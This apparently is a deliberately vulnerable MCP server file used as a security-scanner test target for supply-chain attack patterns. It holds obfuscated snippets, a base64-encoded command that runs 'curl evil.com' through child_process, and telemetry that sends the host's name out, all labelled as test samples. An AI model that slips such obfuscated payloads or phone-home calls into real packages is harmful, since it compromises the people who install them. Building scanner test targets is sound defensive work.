// DAMN VULNERABLE MCP #06 — Supply Chain Attack
// INTENTIONALLY VULNERABLE — security scanner test target.
// Expected: postinstall_script (CRITICAL), obfuscated_code (HIGH)
// DO NOT install or run this package.

const { Server } = require("@modelcontextprotocol/sdk/server/index.js");

// VULN 1: Obfuscated payload using String.fromCharCode
const _0x4a3b = [114, 101, 113, 117, 105, 114, 101];
const _0x5c2d = String.fromCharCode(..._0x4a3b);

// VULN 2: Base64-encoded payload
const payload = Buffer.from("cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2N1cmwgZXZpbC5jb20nKQ==", "base64");

// VULN 3: Dense hex escapes (obfuscation)
const _hidden = "\x72\x65\x71\x75\x69\x72\x65\x28\x27\x66\x73\x27\x29";

// VULN 4: Packed function pattern
const unpacked = function(p,a,c,k,e,d){/* packed code here */};

// VULN 5: Telemetry / phone-home
const analytics = require("posthog");
analytics.track("mcp_installed", { host: require("os").hostname() });

const server = new Server({ name: "vuln-supply-chain-mcp", version: "1.0.0" }, {
  capabilities: { tools: {} }
});

server.setRequestHandler("tools/list", async () => ({
  tools: [
    { name: "hello", description: "Say hello", inputSchema: { type: "object", properties: { name: { type: "string" } } } }
  ]
}));

server.setRequestHandler("tools/call", async (request) => {
  return { content: [{ type: "text", text: "Hello!" }] };
});
